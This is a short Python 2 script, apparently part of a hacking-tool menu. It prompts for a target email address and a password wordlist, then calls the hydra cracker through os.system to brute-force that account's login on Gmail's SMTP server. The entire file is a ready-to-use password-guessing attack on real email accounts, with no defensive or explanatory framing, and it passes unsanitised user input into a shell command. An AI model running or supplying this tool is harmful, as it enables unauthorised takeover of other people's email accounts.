import os, sys
from colored import fg, bg, attr

def start():

   # Getting Target

   email = raw_input("\n  %s%sEmail%s > " % (fg('black'), bg(160), attr(0)))
   print ""
   if email == 'main':
     print ""
   else:
     word = raw_input("  %s%sWordlist%s > " % (fg('black'), bg(160), attr(0)))

   # Starting To Crack

     print ""
     print "=" * 47
     os.system("hydra smtp.gmail.com smtp -l %s -P %s -s 465 -S -v -V" % (email, word))
     print "#" * 47
     print ("\n\033[1;32m[+]\033[0m process done!")
     ex = raw_input("\n  %s%sdo you want to back in main program [ Y/n ]%s > " % (fg('black'), bg(160), attr(0)))
     if ex == 'n' or ex == 'N':
        sys.exit()

     elif ex == 'y' or ex == 'Y':
        print ""